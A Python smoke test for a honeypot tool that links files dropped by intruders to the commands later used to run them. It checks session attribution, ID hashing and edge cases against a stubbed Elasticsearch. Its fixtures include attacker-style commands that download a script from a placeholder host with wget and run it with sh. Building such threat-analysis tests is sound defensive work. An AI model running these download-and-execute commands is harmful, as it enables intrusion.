"""Smoke test for the file -> command crossref miner (brutal-review 7.6).

Covers, with a stubbed ES:
  * Same-session drop+exec: `cross_session=false`, first_executed points
    at the same session as first_seen.
  * Cross-session drop -> exec: drop in session X, exec by command in
    session Y > X for the same IP. `cross_session=true`, n_sessions_executed=1.
  * Two IPs, same hash: two distinct crossref docs (distinct _ids,
    same sha256).
  * Same hash dropped in multiple sessions by the same IP: timeline
    sorts ascending, `first_seen` is the earliest, `n_sessions_dropped > 1`.
  * Filename rejected by specificity guard: no cross-session lookup,
    no false-positive cross_session.
  * Missing sessions index: clean no-op return.
  * Empty session list (file_events absent): no docs.
  * Idempotence: `_crossref_id` is content-addressed on (sha, ip).

Stubs ES; no network.

Run from the repo root:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke/smoke_test_file_crossref.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from enrich.sources.cowrie.file_crossref import (  # noqa: E402
    _crossref_id, _filename_is_specific,
    run_mine_file_crossref,
)


PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


# ---------------------------------------------------------------------------
# Stubs.
# ---------------------------------------------------------------------------

class _StubIndices:
    def __init__(self, missing: set[str] | None = None):
        self.missing = missing or set()
    def exists(self, *, index):
        return index not in self.missing
    def refresh(self, *, index):
        pass


class _StubES:
    """Replays a scripted set of session-rollup hits + commands-index hits.

    `sessions_hits`     : list[dict] in session-rollup shape (one search call).
    `commands_hits`     : list[dict] in commands-index shape (one search call,
                          when triggered by `_resolve_first_executed`).
    `candidate_sessions`: list[dict] in session-rollup shape, returned by the
                          'sessions with command_set=X for ip=Y' subquery.
    """
    def __init__(self, *, sessions_hits, commands_hits=None,
                 candidate_sessions=None, missing=None):
        self.sessions_hits = sessions_hits
        self.commands_hits = commands_hits or []
        self.candidate_sessions = candidate_sessions or []
        self.indices = _StubIndices(missing=missing)
        self.writes: list[tuple[str, list]] = []
        self.call_log: list[tuple[str, dict]] = []
        self._first_sessions_call = True

    def search(self, *, index, **kwargs):
        self.call_log.append((index, kwargs))
        # Dispatch on which logical call this is by inspecting the
        # query body and the requested _source.
        query = kwargs.get("query") or {}
        if index.endswith(".sessions_rollup") or index.endswith("session"):
            # `_iter_session_file_events` uses nested file_events query
            # with sort by event.start asc.
            if "nested" in query:
                # Return the initial page, then empty on second call.
                if self._first_sessions_call:
                    self._first_sessions_call = False
                    return {"hits": {"hits": self.sessions_hits}}
                return {"hits": {"hits": []}}
            # `_resolve_first_executed` does a bool query with terms on
            # command_set + range on event.start.
            return {"hits": {"hits": self.candidate_sessions}}
        if index.endswith(".command"):
            return {"hits": {"hits": self.commands_hits}}
        return {"hits": {"hits": []}}


class _Cfg:
    class elasticsearch:
        class indexes:
            class cowrie:
                sessions_rollup = "prism.rollup.cowrie.session"
                commands        = "prism.enrichment.cowrie.command"
                file_command_crossref = "prism.crossref.file_command"


def _bulk_capture(es, idx, actions):
    es.writes.append((idx, list(actions)))
    return len(actions), []


_STUB_ES_HOLDER: list = [None]


def _patch_module():
    """Direct in-process monkeypatch since we don't have pytest."""
    import enrich.sources.cowrie.file_crossref as fcx

    fcx.bulk_write = _bulk_capture
    fcx.init_index = lambda *a, **kw: None
    # The miner instantiates its own ES client via make_client. Replace
    # with a getter pulling from the smoke test's holder so each test
    # can swap stubs in.
    fcx.make_client = lambda *a, **kw: _STUB_ES_HOLDER[0]


_patch_module()


def _set_stub(es):
    _STUB_ES_HOLDER[0] = es


def _sessions_hit(*, sid, ip, ts, file_events, command_set=None):
    """Synthesize a session-rollup hit. Field paths match
    `_iter_session_file_events` _source spec. `sort` is required for
    search_after pagination — single-page tests use [ts, sid] but the
    iterator only reads it (any opaque value works)."""
    return {
        "_id": sid,
        "_source": {
            "cowrie": {"session_id": sid},
            "source": {"ip": ip},
            "event":  {"start": ts},
            "dshield": {"cowrie": {"enrichment": {"session": {
                "file_events":  file_events,
                "command_set":  command_set or [],
            }}}},
        },
        "sort": [ts, sid],
    }


def _cmd_hit(*, command_hash, line):
    return {
        "_id": command_hash,
        "_source": {
            "process": {"command_line": line, "hash": {"sha256": command_hash}},
        },
    }


def _file_event(sha, *, action="download", filename, ts, command_hash=None, attribution=None):
    rec = {"sha256": sha, "action": action, "filename": filename, "ts": ts}
    if command_hash:
        rec["command_hash"] = command_hash
    if attribution:
        rec["command_attribution"] = attribution
    return rec


# ---------------------------------------------------------------------------
# [1] _crossref_id format + idempotence.
# ---------------------------------------------------------------------------
print("[1] _crossref_id format + idempotence")
SHA = "a" * 64
IP = "203.0.113.10"
fid_a = _crossref_id(SHA, IP)
fid_b = _crossref_id(SHA, IP)
check("starts with fcx-",            fid_a.startswith("fcx-"))
check("is 4 + 16 chars total",       len(fid_a) == len("fcx-") + 16)
check("idempotent across calls",     fid_a == fid_b)
check("varies by IP",                _crossref_id(SHA, "203.0.113.11") != fid_a)
check("varies by sha",               _crossref_id("b" * 64, IP) != fid_a)


# ---------------------------------------------------------------------------
# [2] filename specificity guard reused.
# ---------------------------------------------------------------------------
print("\n[2] filename specificity guard")
check("'sshd' rejected (too short, no ext)",    not _filename_is_specific("sshd"))
check("'a.sh' accepted",                         _filename_is_specific("a.sh"))
check("'longname' (>=5) accepted",               _filename_is_specific("longname"))


# ---------------------------------------------------------------------------
# [3] Same-session drop + exec: cross_session=false, first_executed is the
#     same session as first_seen because the in-session attribution
#     (`destfile_match`) carried the command_hash directly.
# ---------------------------------------------------------------------------
print("\n[3] same-session drop+exec: cross_session=false")
es = _StubES(
    sessions_hits=[
        _sessions_hit(
            sid="sX", ip=IP, ts="2026-05-30T10:00:00Z",
            file_events=[_file_event(
                SHA, action="download", filename="loader.sh",
                ts="2026-05-30T10:00:05Z",
                command_hash="cmd-abc", attribution="destfile_match",
            )],
            command_set=["cmd-abc"],
        ),
    ],
    # _resolve_first_executed runs a commands-index search; return a
    # matching command line so cross-session resolution would otherwise
    # work — but it'll find the same session since first_seen.ts is the
    # `gte` lower bound and there's only one session here.
    commands_hits=[_cmd_hit(command_hash="cmd-abc", line="wget http://x/loader.sh")],
    candidate_sessions=[_sessions_hit(
        sid="sX", ip=IP, ts="2026-05-30T10:00:00Z",
        file_events=[], command_set=["cmd-abc"],
    )],
)
_set_stub(es)
stats = run_mine_file_crossref(_Cfg, secrets=None, dry_run=False)
check("one pair seen",   stats["pairs_seen"] == 1, str(stats))
check("one pair written", stats["pairs_written"] == 1)
check("zero cross_session", stats["cross_session"] == 0)
written = es.writes[0][1]
doc = written[0]["_source"]
check("doc carries first_seen.session_id sX",
      doc["first_seen"]["session_id"] == "sX")
check("doc carries first_executed.session_id sX",
      (doc.get("first_executed") or {}).get("session_id") == "sX")
check("cross_session=false on doc",  doc["cross_session"] is False)
check("n_sessions_dropped=1",        doc["n_sessions_dropped"] == 1)


# ---------------------------------------------------------------------------
# [4] True cross-session drop -> exec.
# ---------------------------------------------------------------------------
print("\n[4] cross-session drop -> exec: cross_session=true")
es = _StubES(
    sessions_hits=[
        _sessions_hit(
            sid="sUPLOAD", ip=IP, ts="2026-05-30T10:00:00Z",
            file_events=[_file_event(
                SHA, action="upload", filename="loader.sh",
                ts="2026-05-30T10:00:05Z",
                # SFTP upload with no in-session command — no attribution.
            )],
            command_set=[],
        ),
    ],
    # The exec session shows up via the candidate_sessions branch.
    commands_hits=[_cmd_hit(command_hash="cmd-run", line="sh /root/loader.sh")],
    candidate_sessions=[_sessions_hit(
        sid="sRUN", ip=IP, ts="2026-05-30T11:00:00Z",
        file_events=[], command_set=["cmd-run"],
    )],
)
_set_stub(es)
stats = run_mine_file_crossref(_Cfg, secrets=None, dry_run=False)
written = es.writes[0][1]
doc = written[0]["_source"]
check("cross_session=true", doc["cross_session"] is True, str(doc))
check("first_seen.session_id sUPLOAD",
      doc["first_seen"]["session_id"] == "sUPLOAD")
check("first_executed.session_id sRUN",
      (doc.get("first_executed") or {}).get("session_id") == "sRUN")
check("first_executed.command_line set",
      "sh /root/loader.sh" in (doc.get("first_executed") or {}).get("command_line", ""))
check("n_sessions_executed=1", doc["n_sessions_executed"] == 1)
check("stats.cross_session=1", stats["cross_session"] == 1)


# ---------------------------------------------------------------------------
# [5] Two IPs, same hash, separate docs.
# ---------------------------------------------------------------------------
print("\n[5] two IPs same hash -> two distinct crossref docs")
es = _StubES(
    sessions_hits=[
        _sessions_hit(
            sid="sA", ip="203.0.113.10", ts="2026-05-30T10:00:00Z",
            file_events=[_file_event(
                SHA, filename="x.sh", ts="2026-05-30T10:00:01Z",
            )],
        ),
        _sessions_hit(
            sid="sB", ip="203.0.113.11", ts="2026-05-30T10:01:00Z",
            file_events=[_file_event(
                SHA, filename="x.sh", ts="2026-05-30T10:01:01Z",
            )],
        ),
    ],
    commands_hits=[],
    candidate_sessions=[],
)
_set_stub(es)
stats = run_mine_file_crossref(_Cfg, secrets=None, dry_run=False)
written = sum((w[1] for w in es.writes), [])
ids = {a["_id"] for a in written}
check("two distinct doc ids", len(ids) == 2, str(ids))
check("both pair_written counted in stats", stats["pairs_written"] == 2)


# ---------------------------------------------------------------------------
# [6] Same hash, same IP, multiple drops: timeline aggregated.
# ---------------------------------------------------------------------------
print("\n[6] same (sha, ip), two drops: aggregated, first_seen is earliest")
es = _StubES(
    sessions_hits=[
        _sessions_hit(
            sid="sLATE", ip=IP, ts="2026-05-30T12:00:00Z",
            file_events=[_file_event(SHA, filename="x.sh", ts="2026-05-30T12:00:01Z")],
        ),
        _sessions_hit(
            sid="sEARLY", ip=IP, ts="2026-05-30T08:00:00Z",
            file_events=[_file_event(SHA, filename="x.sh", ts="2026-05-30T08:00:01Z")],
        ),
    ],
    commands_hits=[],
    candidate_sessions=[],
)
_set_stub(es)
stats = run_mine_file_crossref(_Cfg, secrets=None, dry_run=False)
doc = es.writes[0][1][0]["_source"]
check("one pair (two records merged)", stats["pairs_seen"] == 1, str(stats))
check("first_seen is earliest (sEARLY)", doc["first_seen"]["session_id"] == "sEARLY")
check("n_sessions_dropped=2", doc["n_sessions_dropped"] == 2)


# ---------------------------------------------------------------------------
# [7] Non-specific filename rejected — no cross-session lookup wired.
#     'a' isn't specific; 'sshd' isn't specific; should still emit a
#     first_seen with no first_executed (and no false-positive
#     cross_session).
# ---------------------------------------------------------------------------
print("\n[7] non-specific filename -> no cross-session attribution attempted")
es = _StubES(
    sessions_hits=[
        _sessions_hit(
            sid="sX", ip=IP, ts="2026-05-30T10:00:00Z",
            file_events=[_file_event(SHA, filename="a", ts="2026-05-30T10:00:01Z")],
        ),
    ],
    # Even if matching commands existed in the index, the filename guard
    # short-circuits the query — these should never be reached.
    commands_hits=[_cmd_hit(command_hash="cmd-noise", line="echo a")],
    candidate_sessions=[],
)
_set_stub(es)
stats = run_mine_file_crossref(_Cfg, secrets=None, dry_run=False)
doc = es.writes[0][1][0]["_source"]
check("first_executed absent (no specific filename)",
      "first_executed" not in doc)
check("cross_session=false", doc["cross_session"] is False)


# ---------------------------------------------------------------------------
# [8] Missing sessions index: clean no-op.
# ---------------------------------------------------------------------------
print("\n[8] missing sessions index: clean no-op")
es = _StubES(
    sessions_hits=[], commands_hits=[], candidate_sessions=[],
    missing={"prism.rollup.cowrie.session"},
)
_set_stub(es)
stats = run_mine_file_crossref(_Cfg, secrets=None, dry_run=False)
check("no pairs seen", stats["pairs_seen"] == 0)
check("reason mentions index missing",
      "missing" in stats.get("reason", ""), str(stats))


# ---------------------------------------------------------------------------
# [9] Empty session list: zero pairs, zero writes.
# ---------------------------------------------------------------------------
print("\n[9] no sessions with file_events: zero pairs")
es = _StubES(sessions_hits=[], commands_hits=[], candidate_sessions=[])
_set_stub(es)
stats = run_mine_file_crossref(_Cfg, secrets=None, dry_run=False)
check("zero pairs",   stats["pairs_seen"] == 0)
check("zero writes",  stats["pairs_written"] == 0)


# ---------------------------------------------------------------------------
# [10] Dry-run path doesn't write.
# ---------------------------------------------------------------------------
print("\n[10] dry-run path: pairs_seen >0, pairs_written=0, no bulk")
es = _StubES(
    sessions_hits=[_sessions_hit(
        sid="sX", ip=IP, ts="2026-05-30T10:00:00Z",
        file_events=[_file_event(SHA, filename="loader.sh", ts="2026-05-30T10:00:01Z")],
    )],
    commands_hits=[],
    candidate_sessions=[],
)
_set_stub(es)
stats = run_mine_file_crossref(_Cfg, secrets=None, dry_run=True)
check("dry_run pairs_seen=1", stats["pairs_seen"] == 1)
check("dry_run pairs_written=0", stats["pairs_written"] == 0)
check("dry_run wrote nothing", es.writes == [])


# ---------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for n, d in FAILED:
        print(f"  - {n}: {d}")
    sys.exit(1)
sys.exit(0)
